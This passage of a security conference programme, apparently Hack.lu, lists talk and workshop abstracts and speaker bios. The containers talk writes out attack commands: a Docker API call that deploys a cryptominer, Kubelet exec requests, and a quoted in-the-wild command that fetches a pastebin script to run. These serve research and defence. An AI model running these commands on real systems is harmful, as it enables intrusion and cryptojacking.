Since then, APT emerged and kept refining their craftsmanship and some run-of-the-mill cybercriminal groups reached a chilling level of proficiency. Cybersecurity conferences and training multiplied and the demand for skilled infosec professionals exploded. And the complexity of IT grew and with it the attack surface.

Yet, for somebody who worked long enough in this field, it feels like cleaning an ever-expanding mess, armed with a teaspoon, while a burnout is lurking in the shadows. So what our core problems besides a substantial part of an industry which keeps pushing semi-magical solutions, lured by the promises for easy money? Why it seems that we aren’t making any true progress? Is it the lack of regulations and policies? Lack of sharing? Or is it an issue of liability and an economic system that is running amok?


### Bio: <a name="Saad+Kadhi"></a>Saad Kadhi

With more than 20 years of experience in operational cybersecurity, Saâd is the head of CERT-EU and the leader of TheHive Project. He devoted the last eleven years of his professional life to incident response, digital forensics and what the cool kids call now cyber threat intelligence. Before joining CERT-EU, he built a CSIRT for a large multinational company, worked at CERT Société Générale and created CERT-BDF, the cyberdefence team of Banque de France, the French national central bank. A convinced retromodernist with a knack for individualistic altruism, he gave trainings, workshops and spoke at conferences such as Hack.lu, the FIRST conference, BSides Lisbon and NorthSec. He is also one of the organisers of the Botconf conference.


## <a name="Kill+MD5+-+demystifying+hash+collisions"></a>Kill MD5 - demystifying hash collisions
by Ange Albertini

Understanding the impact of hash collisions without a PhD in crypto.
Showing how vulnerable MD5 can be.




### Bio: <a name="Ange+Albertini"></a>Ange Albertini

File formats enthusiast.


## <a name="Smartphone+apps%3A+let%27s+talk+about+privacy"></a>Smartphone apps: let's talk about privacy
by Axelle Apvrille

Smartphone applications do not respect your privacy.
If you are at Hack.Lu, you probably more or less already know this.
In the best cases, you found a few solutions to minimize the issue.
Or you surrendered (what can we do about it, huh?).

But are you really aware of the *extent* of the problem? Is it only your IMEI and your location that leak?
Are there are still private apps out there?
Jump in for some Android disassembly, logs and Frida hooks.

I am a malware researcher. So, every day, I disassemble Android apps, and decide whether they are benign or malicious. We can't expect privacy from malware, can we? But actually, nearly all so-called benign applications I look into are *far from private*.

It is time we discuss this seriously in a conference. I want to show you the extent of garbage-ware we find in our smartphone's apps. Adkits are big issue, of course. There are hundreds. But there are not the only ones. There are also analytics, crash reporting, IO analyzers, affiliate SDKs, cross platform gaming frameworks...

Sometimes, privacy issues are blatant. Very often though, they are more insidious: e.g. reports are anonymized, but the level of details is a concern. We show issues in common genuine apps we use every day. People who use Facebook, Messenger etc usually know they face a few privacy issues. How about medical applications? games? Why do simple applications weigh 30MB for tasks they could do in less than 2? Are there still private apps out there?

Let's look inside our smartphones.


### Bio: <a name="Axelle+Apvrille"></a>Axelle Apvrille

Axelle Apvrille is principal security researcher at Fortinet. She specifically looks into mobile malware and smart devices (not always that smart...). She is the lead organizer of Ph0wn CTF, a Capture The Flag dedicated to smart devices.


## <a name="The+Red+Square+-+Mapping+the+connections+inside+Russia%27s+APT+Ecosystem"></a>The Red Square - Mapping the connections inside Russia's APT Ecosystem
by Itay Cohen, Ari Eitan

If the names Turla, Sofacy, and APT29 strike fear into your heart, you are not alone. These are known to be some of the most advanced, sophisticated and notorious APT groups out there -- and not in vain. These Russian-attributed actors are part of a bigger picture in which Russia is one of the strongest powers in the cyberwarfare today. Their advanced tools, unique approaches, and solid infrastructures suggest an enormous and complicated operation that involves different military and government entities inside Russia. 

That said, and with all the available information on these groups, there are still some questions to bear in mind: Are the different government entities working alone or are they sharing code and techniques with each other? What artifacts, libraries and code are more likely to be shared between different families and teams of the same actor? 

The fog behind these complicated operations made us realize that while we know a lot about single actors, we are short of seeing the bigger picture - a whole ecosystem with actor interaction (or lack thereof) and particular TTPs that can be viewed in a larger scope. We decided to know more and to look at things from a broader perspective. This led us to gather, classify and analyze thousands of Russian APT malware samples in order to find connections - not only between samples, but also between different families and actors. 

In this talk, we will describe the process of our research. Namely, we will show how the technologies at our disposal allowed us to take a deep dive into these malware's binary DNA in order to spot the mutual Genes that are shared between Russia's APT families and actors. We will show interesting connections that we found, and present the interactive map we created to visualize this complicated Russian APT ecosystem. We will also release a signature-based tool to detect old and new samples based on the popular mutual Genes we found.

Outline:
--------
 - About us
 - Objectives and Motivation
 - Presenting the main Russian APT Groups
   - in addition to worth-mention incidents
 - The Technology
   - allows us to detect even the smallest fragments of code similarities between files
 - The Process   
   - gathering samples attributed to Russia
   - classifying the samples to families and actors
   - Analyzing the data
 - Spotting interesting connections
 - Present the found connections between different families and actors
   - Code similarities - Assembly level
   - Mutual TTPs
   - other connections
 - Release two tools for the community
   - A visual and interactive map of the connections between the dozens of the families
   - A signature-based tool to detect old and new samples based on popular mutual "Genes" in the ecosystem
 	- Including a dedicated ruleset to be shared with the community
 - Insights and Conclusion


### Bio: <a name="Itay+Cohen"></a>Itay Cohen

Itay Cohen (aka Megabeets) is a Security Researcher and a Reverse Engineer in the Malware and Vulnerability Research group at Check Point. Itay has years of extensive background in malware reverse engineering and many other security-related topics. He is the author of https://megabeets.net, a security blog focused on making advanced security topics accessible for free.

On his free time, Itay loves to participate in CTF competitions and to contribute to open-source projects. He is a core developer of the open-source reverse engineering framework radare2 and the maintainer of Cutter, radare2's official GUI.


### Bio: <a name="Ari+Eitan"></a>Ari Eitan

Ari Eitan is the VP Research of Intezer Labs, a security researcher and Incident Response professional. Ari served as the head of IDF Incident Response team and has vast experience in dealing with Nation-sponsored cyber attacks, specializing in Malware Analysis, Reverse Engineering and Forensics. He has spoken at a variety of security conferences and trainings, including the first BsidesTLV, Kaspersky SAS, and for government organizations and international agencies.


## <a name="Hacktivism+as+a+defense+technique+in+a+cyberwar.+%23FRD+Lessons+for+Ukraine"></a>Hacktivism as a defense technique in a cyberwar. #FRD Lessons for Ukraine
by Kostiantyn Korsun

Since 2014 Ukraine is under cyberwar. 
Energy grid attack BlackEnergy switched off electricity for 230,000 people for 6 hours. NotPetya attack effected ~30% of Ukrainian economy. Airports, railways, banking system, media, critical infrastructure had been attacked by Russian cyber groups (Telebots, BadRabbit, GrayEnergy).
But have those attacks strengthened national cybersecurity system of Ukraine?
Ukrainian cyber activists (hacktivists) checked that and published some shocking results.
This activity got the name #FuckResponsibleDisclosure (#FRD)
My talk is a historical retrospective of #FRD: when and how it started, what emotions it caused in Ukraine, how officials and resources’ owner communicated with hacktivists and others. How #FRD influenced on national cyber security and what local Cybersec-community thinks on #FRD.
The preso contains plenty of expressive screenshots.

I researched #FRD as a unique activity in modern cybersecurity world.
The main goal of #FRD is to increase cybersecurity level in Ukraine. 
However Ukrainian cyber activists used controversial methods to get this goal publishing indicators of low level of cyber protection in Governmental institutions and critical infrastructure objects.
What was right/wrong in #FRD and how it influenced on national cybersecurity?
This is the matter of the research.


### Bio: <a name="Kostiantyn+Korsun"></a>Kostiantyn Korsun

As former deputy head of Cybercrime Division at Security Service of Ukraine (colonel ret.), Kostyantyn Korsun was one of the founders and the first head of CERT-UA. After resigning from the service, Kos acted as Regional Director for Ukraine Research Office of iSIGHT Partners, international cyber threat intelligence company. Then he cooperated with Symantec Corp. as an official vendor of Threat Intelligence service. Currently a CEO and Co-Founder of Berezhs Security LLC., a company that provides services in Penetration Testing, Security Awareness Programs, Software Security Assessment, Bug Bounty Program, Social Engineering Assessment, Application Security Programs. Mr. Korsun is an active member of the local cyber community in Ukraine promoting cybersecurity ideas within Ukrainian society.


## <a name="DNS+On+Fire"></a>DNS On Fire
by Rascagneres Paul, Warren Mercer

Cisco Talos identified malicious actors targeting the DNS protocol successfully for the past several years. In the presentation, we will present 2 threat actors we have been tracking.

The first one developed a piece of malware, named DNSpionage, targeting several government agencies in the Middle East, as well as an airline. During the research process for DNSpionage, we also discovered an effort to redirect DNSs from the targets and discovered some registered SSL certificates for them. We identified multiple countries targeted by this redirection. On 22 January 2019, the US DHS published a directive concerning this attack vector. In this presentation, we will present the timeline for these events and their technical details. 

The second actor is behind the campaign we named “Sea Turtle”. This actor is more advanced and more aggressive than the previous one. They do not hesitate to target directly registrars and one registry. The talk will present the 2 actors and the methodology used to target the victims.

This talk will include:
  - DNS presentation because few ppl mix register, registrar, registrant
  -  the oilrig leak on the similarities between DNSpionage and the technical details in the leak.
  - unpublished DNS hijack if the investigation is finished by the conference.


### Bio: <a name="Rascagneres+Paul"></a>Rascagneres Paul

Paul is a security researcher within Talos, Cisco’s threat intelligence and research organization. As a researcher, he performs investigations to identify new threats and presents his findings as publications and at international security conferences throughout the world. He has been involved in security research for 7 years, mainly focusing on malware analysis, malware hunting and more specially on Advanced Persistence Threat campaigns and rootkit capabilities. He previously worked for several incident response team within the private and public sectors.


### Bio: <a name="Warren+Mercer"></a>Warren Mercer




## <a name="Leveraging+KVM+as+a+debugging+platform"></a>Leveraging KVM as a debugging platform
by Mathieu

Virtual Machine Introspection keeps opening new possibilities to interact with
Virtual Machines, from sandboxing (VMRay), to cloud monitoring solutions
(BitDefender HVI).

Our debuggers needs to benefit from this approach too, and so far we have seen
multiple open source projects trying to leverage the hypervisor as a new
debugging platform. However, most of these solutions are tied to one
hypervisor.

The VMI ecosystem can only grow if it can bring all developers under the same
roof, and provide the core libraries that will be the foundation for all VMI
applications.

Keeping this vision in mind, pyvmidbg is a GDB stub built on top of LibVMI, a
hypervisor-agnostic VMI library. It can introspect Windows VMs and explore the
execution context to target and debug a specific process running on the system.

One of the goals of pyvmidbg is to attract developers and users by writing the
missing layers that prevent VMI from gaining a wider adoption as of today.

The lack of VMI APIs available on KVM has made of LibVMI a Xen centric library,
despite its flexible architecture.  However, the situation recently changed in
2017, thanks to BitDefender proposing a new set of APIs for introspection.

This talk will demonstrate the new KVM introspection subsystem proposed by
BitDefender, its integration in LibVMI, and how pyvmidbg is running on top of
KVM today.




### Bio: <a name="Mathieu"></a>Mathieu

TODO


## <a name="Who+contains+the+containers"></a>Who contains the containers
by Emilien, Ioana Andrada

# Who contain the containers ?

## introduction

Today it is extremely easy to deploy micro-services using containers technologies. And as usual for every easy-to-deploy technologies, people have tendencies to not using common sense before using them: You are one-click away from being easily compromised !

In this talk we will present most common vulnerabilities and unsecure configurations found on containers technologies and how to exploit them. Then we will try to figure out if we can find actually compromised containers on Internet. Finally we will describe recommendations on how to secure and how to detect attacks against container technologies.

## Attacks against container technologies

When we speak about container technologies, two main components may be subject to attacks:

 * Containers technologies (docker, rkt, Solaris containers, Microsoft Containers ...)
 * Container orchestration tools (kubernetes, apache meos, docker swarm, docker data center)

Another important part of the environment is the storage container (clusterHQ, BlockBridge,EMC...) but it can be attacked through the orchestration engine so we will not describe them with too much details in this talk.

Also it is important to highlight the fact that most cloud service providers provide their own implemantation of orchestration tools, which can be targeted as well.


### exploit vulnerabilities to break out of containers

Worst scenario for containers is the possibility for a malicious or compromised container to escape and attack the host system. Of course it happened with a vulnerability on runC (CVE-2019-5736: runc container breakout).

Vulnerability was discovered by Adam Iwaniuk and Borys Popławski and affect most of the containers softwares and a proof-of-concept is available: https://github.com/Frichetten/CVE-2019-5736-PoC

As this vulnerability is probably the most critical, others are not to be ignored:
 
 * CVE-2018-11757 (Docker): a Docker action inheriting the Docker tag openwhisk/dockerskeleton:1.3.0 (or earlier) may allow an attacker to replace the user function inside the container if the user code is vulnerable to code exploitation,
 * CVE-2018-8115 (Docker for Windows): A remote code execution vulnerability exists when the Windows Host Compute Service Shim (hcsshim) library fails to properly validate input while importing a container image,
 * Vulnerabilities on "rkt enter" commands (CVE-2019-10144, CVE-2019-10145 and CVE-2019-10146): discovered by Yuval Avrahami, those vulnerabilities could be used to escape to the host system by putting traps on modified binaries in a compromised container (https://www.twistlock.com/labs-blog/breaking-out-of-coresos-rkt-3-new-cves/)

### abusing APIs

APIs are great to automate admin tasks ... or compromising at a scale. If not properly secured, API access can be used to start, delete or configure containers or the host sytem. 

Here is some attack example abusing APIs:

 - Docker: create container via API 

Docker API is exposed on port 2375/TCP or 2376/TCP (SSL). If default configurtion is used (who do that ? :D) a simple POST request give us the possibility to deploy and start a Docker Image. The image will be downloaded from Docker Hub automatically...

We can use a crafted HTTP request or just the docker client as shown bellow:

`docker -H target:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig -o POOOOL  -u WALLET -p X -k`



 - Kubernetes: Unauthenticated endpoint on Kubelet (port 10250) to perform `exec` command

The exploitation take 2 steps, first a POST request to the exec endpoint:

`POST "https://target:10250/exec/<namespace>/<podname>/<container-name>?command=whoami&input=1&output=1&tty=1"`

Then a GET request (SPDY capable client) using location header from the response of the previous request

`wscat -c "https://target:10250/cri/exec/XxXxXxXx" --no-check`

A single GET request is used to list the available containers on the target:

`GET "https://target:10250/pods"`



Those two examples can be reproduced against most orchestration tools of the API endpoints are not properly secured.


### compromising containers repositories

Supply-chain attacks can happen on container image repositories. An attacker could successfully push an update to a well-known container image and just wait for victims to deply/update. Or even creating an account on the repository (let say `Docker Hub` for example) and convincing people to use their images.

That is exacly what happen recently with Zuulu2 botnet (see https://github.com/docker/hub-feedback/issues/1809). Somebody pushed a `cryptomining` image on Docher Hub and exploit weak configuration to download and run the container image. The image is also used to discover new potential targets.




## Is it legit ?

While working on another project, we stumbled accross some strange containers online, so we asked ourself if we could find more of those suspicious stuff. We mostly concentrated on Docker as it is the most popular (so the most targeted)

To do that, we developped some script to extract information on available containers online via their exposed API endpoints and parse the extracted data to highlight potentially "unwanted" containers. Identifying online API is done by leveraging internet scanning services (Shodan, Onyphe and Censys).

Another technique consist of downloading unverifed images (to limit the scope of the investigation, we look for modified `alpine` images) from container images repositories and analysing startup scripts of those images. A good tool to perform this task for Docker images is Dive (https://github.com/wagoodman/dive). 

In this part, we will present some interesting containers we found running online and drill-down to the TTPs used by the TA behind the supposed infection. Here is some examples (all Docker):

### Xmrig image

Suspicious level: low

We found some docker image used for cryptocurrency mining which may be suspicious because it is probably the least efficient way to do mining... but we never know.

### Nice wget you got there

Suspicious level: high

Ok this time we are sure it is malicious : `chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;rm hrfbyyu.sh;wget https://pastebin.com/raw/h7HiT3uR ...` 

So when the image it started, it will install wget via `yum` OR `apt-get`, then download and execute a script from `pastebin` ... does not really look legit ...

The script itself is base64 encoded and contains update and persistence mechanisms for Linux and cryptomining activities.

### Xulu botnet

Suspicious level: high

Some month ago, a user named `zuulu2` on Docker Hub uploaded malicious images perfoming scanning of other potential victims and cryptomining activities. It spread exploiting open Docker API. Malicious images were removed from Docker Hub.

By getting the list of running or available containers, we can see that the zuulu2 images are still running on several servers.

### Dockerfile: CMD ["/run.sh"] 

We identified this image posted on Docker Hub 6 month ago. User only uploaded one image and the description was just `CMD ["/run.sh"]`. By using Dive, we identified modifications from the base image (alpine):

 - adding a user named `miner`
 - downloading and compiling xmrig
 - starting the mining process (XMR)




## Containers security
 
The security of a container does not resume only to the container itself. A container is based on an image, which contains all the files required to run. But what if the used image is vulnerable or it has some configuration defects,embedded clear text secrets or it might contain embedded malware, intended to do something else than the initial purpose.

Many images for containers are stored usually in a central location because they are easy to control, reuse, share across the community. Do we trust those  registries or are we sure that the connection to those registries is secure?

Orchestration tools are great for managing the containers. They pull the images from registries , deploy images into containers and manage the running containers. But is it always clearly defined who has access or not?Do we trust the orchestrator node in the cluster? Is it properly separated the network traffic between the containers in the orchestrator configuration ?

Multiple containers share the same OS kernel instance.Each operating system has a container runtime, which coordinates different OS components in such a way that each container sees only its dedicated resources and it is isolated from other containers running at the same time. Anyone with access to the kernel root account can see and access all containers.The attack surface level on the host OS is pretty big. The attacker can attempt to exploit host OS vulnerabilities, tampering file systems or gain priviledged user access rights.

 
### Hardening

When you think at hardening a container, you have to take into consideration all the components that make a container up and running. And as there is no clear and concrete security for the containers, we have to find measures to harden every component.
We will present best practices for each component.

#### Container Images Security
* use only signed images from trusted registry
* visibility into all layers of the image
* validation of the configuration of the images, regular patching updates
* constant monitoring 

#### Host Security
* harden the host
* always patch
* grant authorization wisely,by controlling user access
* separate partitions for containers
* audit all the container's activity

#### Container Runtime Security
* namespaces - what a container can see and to what extenct can interract with each oter internally
* cgroups - how much of shared kernel and system resources a container will consume
* seccomp - secure computing mode
* process restrictions
* device and file restrictions

#### Orchestration environment security
* limit direct access
* fine-grained-access control rules
* administrative boundaries
* resource quota
* safe management and distribution of secrets
* encrypt data exchange


### Auditing

It is important to continously scan your containers for vulnerabilities of various kinds,including bugs,inadequate authentication and authorization ,embedded secrets and misconfiguration. 
Auditing containers can be challenging, on one side because of their architecture and on the other side the short lifetime and the density of the containers deployed. It becomes really difficult to track what exactly was deployed.

On your host audit regular Linux file system and system calls and also log who is running the container service. Add audit rules for the container service using **auditd**.
Also make sure you have a container-native log collection agent on your host , which provides automatic collection and processing of container logs.


### Monitoring

Monitoring your container activity it is essential in identifying security incidents and providing audit trails.
Containered environments require logging at multiple layers - the host, the container orchestrator and the container itself. 
* monitor and capture host logs
* monitor the container orchestration system used like Docker Swarm, Kubernetes, Apache Mesos and Hashicorp Nomad
* ensure adequate log information at the containers, by setting the log level in your container

#### Tools

There are different tools out there, which might help you in monitoring your containered environment, but this is not done easily. 

* docker remote API - The docker engine client provides an API, through which you collect basic monitoring function of Docker containers 
* container advisor(cAdvisor) - it consists of a container, which can collect,process,aggregate and export information related to running containers.
* prometheus - monitoring tools that can be used to observe metrics and raise alerts, based on the applied alerting rules over the input data. Everything can be displayed in a UI dashboard,based on Grafana


## Conclusion

Micro-services are the future they say. Sure thing for cyber-criminals ! As those technologies will be more and more used and most probably in the cloud, SOC teams need to start worrying about the potential impact and how to face those new threats. It will take time. Oh and we did not spoke about serverless services like AWS Lambda ...




### Bio: <a name="Emilien"></a>Emilien

Emilien Le Jamtel is a French security analyst, versatile member of CERT-EU since 4 years. With a strong background in offense, he is now playing defense as responsible for the monitoring and threat hunting activities in CERT-EU. In both professional and personal life, he is fond of games and difficult challenges and he probably forgot to answer your emails.


### Bio: <a name="Ioana+Andrada"></a>Ioana Andrada




## <a name="Exploiting+bug+report+systems+in+the+game+industry"></a>Exploiting bug report systems in the game industry
by Andreia Gaita

In the world of development, what do you do when you run into a bug in the library, framework, or middleware you're using? You submit a bug report and describe the steps. The companies providing you with the software expect and encourage you to send in repro code, but the bigger the system, the more complex the code needs to be to reproduce the problem. In the case of game development, the expectation is that when you find a bug, you submit a complete test project that exemplifies the problem, so that test teams can reproduce it. What can these test projects contain? How are they tested by companies developing game engines and middleware? What potential exploitation venues does this open?

There are unique conditions in the game industry that make it particularly vulnerable to certain types of attacks, but its uniqueness also makes it somewhat of a puzzle to the rest of the tech industry. In this talk, we'll go through some of the particulars of how game development works, and how these practices and bug reporting systems can be exploited to gain access to the core of development teams across the game industry.




### Bio: <a name="Andreia+Gaita"></a>Andreia Gaita

Andreia Gaita is a freelance cross-platform games and tools developer, recently shifting her focus to security work. For the past 18 years, she has been involved in the development of game engines, applications, open source tools and libraries, and has been an engineering manager and tech lead at companies like GitHub, Unity, and Xamarin. She hails from the sunny city of Lisbon, Portugal, and currently lives in Copenhagen, Denmark, where she bikes a lot (when it's warm).


## <a name="Beyond+Windows+Forensics+with+Built-in+Microsoft+Tooling"></a>Beyond Windows Forensics with Built-in Microsoft Tooling
by Thomas Fischer

Microsoft has slowly been introducing tools to help organisations better manage and troubleshoot Windows performance and issues; these are now entirely integrated into Windows. To improve performance and troubleshooting capabilities, Microsoft introduced System Resource Usage Monitor (SRUM) in Windows 8 and beyond. PowerShell has become the default “command line” management tool for windows administrators. These tools provide both a wealth of information into what has happened and is present on the system.

For Forensics and even Incident Response, these tools are now a go to built-in option to bootstrap and drive the forensics process including opening access to artefacts that overzealous user or even a “smart” attacker has removed. SRUM for instance can provide data points ranging from network to process activitiy providing insight into what, who, when and how an attacker or malicious process introduced itself into the environment. 

This talk will help the participant build the foundations to identify which built in tools can assist in the Windows Forensics process and the data points that are available as well as examine how services such as SRUM can be used to extract key data points to provide information for incident response or threat hunting activities.




### Bio: <a name="Thomas+Fischer"></a>Thomas Fischer

Thomas has over 30 years of experience in the IT industry ranging from software development to infrastructure & network operations and architecture to settle in information security. He has an extensive security background covering roles from incident responder to security architect at fortune 500 companies, vendors and consulting organisations. He is currently security advocate and threat researcher focused on advising companies on understanding their data protection activities against malicious parties not just for external threats but also compliance instigated.

Thomas is also an active participant in the InfoSec community not only as a member but also as director of Security BSides London, ISSA UK chapter board member and speaker at events like SANS DFIR EMEA, DeepSec, Shmoocon, Troopers and various BSides events.


## <a name="Defeating+Bluetooth+Low+Energy+5+PRNG+for+fun+and+jamming"></a>Defeating Bluetooth Low Energy 5 PRNG for fun and jamming
by Damien Cauquil

Bluetooth Low energy version 5 has been published in late 2016, but we still have
  no sniffer supporting this specific version (and not that much compatible devices
  as well). The problem is this new version introduces a new channel hopping algorithm
  that renders previous sniffing tools useless as devices can no longer be attacked
  and connections analyzed. This new algorithm is based on a brand new pseudo-random
  number generator (PRNG) to provide better collision avoidance while kicking out
  all of our good old sniffing tools.

  Unless some random hacker manages to break this not-that-strong PRNG and upgrades
  his BLE sniffing tool to support this algorithm ;). In this talk, we will explain
  why this PRNG is vulnerable and how it can be easily defeated to sniff and jam
  communications between two BLE 5 devices. A new version of BtleJack will be
  released during this talk, providing an efficient way to sniff BLE 5 connections
  to our fellow IoT hacker family.




### Bio: <a name="Damien+Cauquil"></a>Damien Cauquil

Damien is a senior security researcher who joined Digital Security in 2015 as head of research and development. He discovered how wireless protocols can be fun to hack and quickly developed BtleJuice, one of the first Bluetooth Low Energy MitM framework, and BtleJack, a BLE swiss-army knife released in 2018.

  Damien presented at various security conferences including DEF CON, Hack In Paris, Chaos Communication Camp, Chaos Communication Congress, BruCon, Hack.lu, anda dozen times at Nuit du Hack, one of the oldest French hacking conference.


## <a name="Effectiveness+in+simplicity%3A+The+Taskmasters+APT"></a>Effectiveness in simplicity: The Taskmasters APT
by Elmar Nabigaev

It is often thought that APT attacks is complex and involve 0-day exploits, stealthy lateral movement and hidden exfiltration path.
While this can be true, it is rarely the case. Even APT actors follow "it if works - don't broke it" rule and use tried and true tactics. If they can get away with it and achieve their goals, why not?

In this talk I’m going to present our discovery of an APT group which used rather simple TTPs but managed to stay undetected and hidden for years while breaching some high value targets in the fields of government, manufacturing, telecommunications etc.

We’re going to dive deep into incident response cases, dissection of tools and techniques they used to infiltrate targets and cover possible attribution.

I’m also going to talk about problems we faced during responding to these cases and present recommendations how to defend networks against this adversary.




### Bio: <a name="Elmar+Nabigaev"></a>Elmar Nabigaev

Elmar is a head of threat intelligence and incident response division at Positive Technologies. He have over 10 years of infosec experience responding to incidents, doing threat hunting and producing threat intelligence. He is a contributor to Volatility and Cuckoo sandbox projects. He is also a frequent speaker at conferences such as PHDays, e-forensics Russia and many others. He’s passionate about all “blue team” things and spends his time researching and inventing new ways of finding bad guys and developing cool infosecurity tools.


# Workshops

## <a name="Faup+workshop%2C+parse+and+investigate+URLs%21"></a>Faup workshop, parse and investigate URLs!
by Sebastien Tricaud

Faup is an opensource tool which allows to work with URLs. Mainly parsing, but also, browser emulation and investigation. This workshop will teach the audience how to use Faup, its library, and write modules to do nifty hacks with URLs.




### Bio: <a name="Sebastien+Tricaud"></a>Sebastien Tricaud

Lead developer of Faup and other opensource tools.


## <a name="Open+the+safe+and+get+cured."></a>Open the safe and get cured.
by Stijn Tomme

Open the safe and get cured.
From manufacturing your network cable to determining the code… and getting the anti-virus

In a 90 minute workshop a team of max. 4 persons can enter the room. During the first 15 minutes they will receive a briefing on the mission. The room has been contaminated by a foreign virus. Hopefully the group can work together and get the “cure” that is locked in the safe. Every team gets 3 attempts to “try” a code. After 60 minutes the mission is over.


### Bio: <a name="Stijn+Tomme"></a>Stijn Tomme

40 years old, been messing around in IT security for about 15 years.


## <a name="Introduction+to+Osquery"></a>Introduction to Osquery
by David Szili

This workshop will introduce osquery to the participants, starting with the capabilities of the tool, how to configure it and use extensions and how to perform fleet management to scale the solution for enterprise environments.

Maintaining real-time insight into the current state of your endpoint infrastructure is crucial.  It is very important from operational, continuous security monitoring, and incident response perspective.  Created by Facebook in 2014, osquery is an open-source instrumentation framework for Windows, OS X (macOS), Linux, and FreeBSD operating systems.  

Osquery exposes the operating system as a relational database and allows you to write SQL queries to explore system data.  The generic SQL tables represent running processes, loaded kernel modules, open network connections, browser plugins, hardware events, file hashes, etc.  These SQL tables are implemented via an easy to extend API and several tables already exist and more are being written.  The main advantage of osquery is that it allows you to use one platform for monitoring complex operating system state across an entire infrastructure.  It has a high-performance and low-footprint distributed host monitoring daemon, osquery and also an interactive query console, called osqueryi.

During this two-hour workshop, we will learn about osquery's capabilities and cover the following topics:
- Osquery basics (installation, osqueryi, osqueryd, osquery schema);
- SQL refresher (SELECT, FROM, WHERE, LIKE, JOIN, etc.);
- Osquery configuration (flagfile, scheduled queries, packs, logging, file integrity monitoring, etc.);
- Osquery extensions;
- Fleet management (Kolide Fleet, Doorman, SGT, etc.);
- Integration with log aggregation platforms (Elastic Stack).

Technical requirements for the workshop:
- A laptop with at least 8 GB of RAM and 30-50 GB of free disk space;
- VMware Workstation, VMware Fusion or VMware Player installed.


### Bio: <a name="David+Szili"></a>David Szili

David Szili is managing partner and CTO of Alzette Information Security, a consulting company based in Luxembourg.  David is also an instructor at SANS Institute, teaching FOR572: Advanced Network Forensics.  He has more than eight years of professional experience in penetration testing, red teaming, vulnerability assessment, vulnerability management, security monitoring, security architecture design, incident response, digital forensics and software development.

David has master's degrees in computer engineering and in networks and telecommunication and a bachelor's degree in electrical engineering.  He holds several IT security certifications such as GSEC, GCED, GCIA, GCIH, GMON, GCDA, GNFA, GPYC, GMOB, CCSK, OSCP, OSWP, and CEH.  David speaks on a regular basis at international conferences like BruCON, Hack.lu, Nuit du Hack, Hacktivity, x33fcon, Black Alps, BSidesLjubljana, BSides Munich, BSidesBUD, Pass the SALT, Security Session and he is a member of the organizer team of BSides Luxembourg.  He occasionally blogs about information security at jumpespjump.blogspot.com.


## <a name="Jobfair"></a>Jobfair
by Hack.lu

As Hack.lu is the biggest and most established technical information security conference in the Benelux region, it attracts a lot of highly technical attendees and some of them are looking for new challenges.

This is why we decided to give the opportunity to companies looking for such profiles to get in touch with them during the conference.




### Bio: <a name="Hack.lu"></a>Hack.lu




## <a name="Malicious+RTF+Document+Analysis"></a>Malicious RTF Document Analysis
by Didier Stevens

Rich Text Format (RTF) documents are consumed by many applications, like Microsoft Word.

Malicious RTF documents contain exploits or embedded objects/links: in this workshop, we go through 20+ exercises to learn how to analyze these documents with Didier's tool rtfdump.py.

Rich Text Format (RTF) documents are also used to deliver a malicious payload. Unlike Word documents, they can not contain VBA macros. To achieve code execution, malware authors have to exploit vulnerabilities, or social engineer the recipient into executing an embedded payload. 

Microsoft Equation Editor vulnerabilities are being widely exploited, and this is reflected in the increased popularity of the RTF format with malware authors. 

The RTF format also lends itself to many obfuscation tricks, making the task of the analyst much harder. 

In this workshop, Didier Stevens will teach you analysis of malicious RTF documents in his typical workshop style: this means hands-on, many exercises, and just a few slides.


### Bio: <a name="Didier+Stevens"></a>Didier Stevens

Didier Stevens (Microsoft MVP Consumer Security, SANS ISC Handler, Wireshark Certified Network Analyst, ...) is a Senior Analyst working at NVISO (https://www.nviso.be). Didier has developed and published more than 100 tools, several of them popular in the security community. 


You can find his open source security tools on his IT security related blog http://blog.DidierStevens.com


## <a name="Introduction+to+WHIDS+an+Open+Source+Endpoint+Detection+System+for+Windows"></a>Introduction to WHIDS an Open Source Endpoint Detection System for Windows
by Quentin JEROME

[WHIDS](https://github.com/0xrawsec/whids) is one of the first open source endpoint detection solution for windows designed with fast Incident Response in mind. It comes with a powerful rule definition format known as [Gene](https://github.com/0xrawsec/gene) allowing one to achieve complex detection primitives. One of its strengths compared to other approaches is that it dumps artifacts (process, file, registry) based on the criticality of the events detected. This allows one to collect artifacts as close as possible of the alert generated. This approach reduces considerably the incident response process while putting the focus on artifact analysis automation. 

The purpose of this workshop will be twofold. In the first place I will introduce the tool and the rule definition format (30 to 45 mins). In a second part some hands-on with the attendees will be made (the rest of the time). The first part of the hands-on will cover simple WHIDS deployment and tweaking. Then comes a realistic case study. In the first place we will study a technique (or a malware) common to everyone and walk through all the steps leading to the final rule creation. Then the attendees will study on their own a technique or malware sample of their choice and build the appropriate detection rule(s). In the last part we will discuss on the possible implementations in a production environment.

### Tools

All the tools being used during the training will be open source or free tools.
* [Sysmon from Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [WHIDS](https://github.com/0xrawsec/whids)
* [Gene](https://github.com/0xrawsec/gene)
* [Public dataset of detection rules](https://github.com/0xrawsec/gene-rules)

All the necessary VMs (Linux + Windows) will be prepared in advance for the attendees to win time during the training.

### Targetted Audiance

* People who care about threat detection on Windows
* Any Blue Team member


### Bio: <a name="Quentin+JEROME"></a>Quentin JEROME

Quentin has been working as incident handler since five years. He is not expert in anything, he just knows how to do several things (programming, reversing, digital forensics ...). He is interested in several topics in IT security ranging from threat detection to bug hunting but what he likes above all is to develop his own tools even though sometimes he reinvent the wheel, just because it is nice to understand how a wheel is made.


## <a name="Java+Web+Application+Secure+Coding+Workshop"></a>Java Web Application Secure Coding Workshop
by Eva Szilagyi

Context-dependent output encoding? Prepared statement with bind variables? Disable external entity resolution? Storing passwords in salted hash format?  If you are involved in Java development, come to my workshop and we will see together, why these are important from a security perspective!

Context-dependent output encoding? Prepared statement with bind variables? Disable external entity resolution? Storing passwords in salted hash format?  If you are involved in Java development, come to my workshop and we will see together, why these are important from a security perspective!

Most vulnerabilities can be prevented by following secure coding best practices from the beginning of the development. As opposed to common misbeliefs, this does not make development more complex or longer. Secure coding becomes more expensive when it is an afterthought and you try to retroactively apply it on a project.

This workshop is meant for developers and security professionals alike. It is delivered by an information security professional with the purpose of demystifying web application secure coding.

During this hands-on workshop, we are going to see not only how common web application vulnerabilities can be prevented, but also common mitigation mistakes and why they are inefficient. We are going to fix together real-life vulnerabilities included, but not limited to:
- SQL injection (SQLi); 
